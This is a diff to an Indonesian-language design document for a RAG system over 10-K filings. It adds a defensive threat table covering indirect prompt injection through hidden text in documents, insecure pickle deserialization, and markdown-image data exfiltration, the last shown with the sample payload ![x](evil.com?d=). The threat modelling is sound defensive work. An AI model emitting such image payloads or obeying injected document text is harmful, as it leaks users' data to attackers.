@@ -139,8 +139,40 @@ FlashRank dipilih karena menggunakan model Cross-Encoder yang dikompresi (sepert
 1. **Backend (Render Free Web Service):**
    * Menjalankan FastAPI via Uvicorn.
    * Qdrant dapat dijalankan secara embedded di memory/disk lokal atau terhubung ke Qdrant Cloud Free Tier (1GB cluster).
-   * BM25 index disimpan dalam file serialisasi binary ringan (`bm25_index.pkl`).
+   * BM25 index disimpan dalam file JSON aman (`bm25_index.json`) untuk mencegah celah eksekusi kode berbahaya (CWE-502 Insecure Deserialization).
 2. **Frontend (Vercel Free Tier):**
    * Single-Page Application (SPA) React + Tailwind CSS.
    * Memanggil API Render via REST JSON.
    * Auto-deploy dari branch `main` GitHub.
+
+---
+
+## 6. Cybersecurity Defense-in-Depth (OWASP LLM Top 10 - 2026 Standard)
+
+Sistem RAG-Ops dirancang dengan kepatuhan penuh terhadap standar keamanan LLM terkini:
+
+```
+┌────────────────────────────────────────────────────────────────────────┐
+│               CYBERSECURITY DEFENSE MATRIX (OWASP 2026)                │
+├─────────────────────┬───────────────────┬──────────────────────────────┤
+│ ANCAMAN CYBER       │ VEKTOR SERANGAN   │ MITIGASI ARSITEKTUR          │
+├─────────────────────┼───────────────────┼──────────────────────────────┤
+│ 1. Indirect Prompt  │ Dokumen 10-K      │ Isolasi konteks via tag XML  │
+│    Injection        │ memuat teks jahat │ <untrusted_context>. LLM     │
+│    (OWASP LLM01)    │ tersembunyi.      │ diinstruksikan menolak input │
+│                     │                   │ tersebut sebagai kode/aksi.  │
+├─────────────────────┼───────────────────┼──────────────────────────────┤
+│ 2. Markdown Image   │ LLM dipaksa buat  │ Frontend menyaring/sanitize  │
+│    Data Exfil       │ tag gambar:       │ tag <img> dan menerapkan     │
+│    (OWASP LLM02)    │ ![x](evil.com?d=) │ Content Security Policy      │
+│                     │ untuk curi data.  │ (CSP: img-src 'self' data:). │
+├─────────────────────┼───────────────────┼──────────────────────────────┤
+│ 3. Vector Isolation │ Pencarian bocor   │ Penegakan filter metadata    │
+│    Weakness         │ ke dokumen ticker │ wajib (ticker_filter) pada   │
+│    (OWASP LLM09)    │ yang tidak sah.   │ layer Vector DB sebelum ANN. │
+├─────────────────────┼───────────────────┼──────────────────────────────┤
+│ 4. Insecure Deseri- │ File pickle BM25  │ Menggunakan serialisasi murni│
+│    alization        │ dieksploitasi RCE │ JSON (bm25_index.json) tanpa │
+│    (CWE-502)        │ (arbitrary code). │ ketergantungan modul pickle. │
+└─────────────────────┴───────────────────┴──────────────────────────────┘
+```
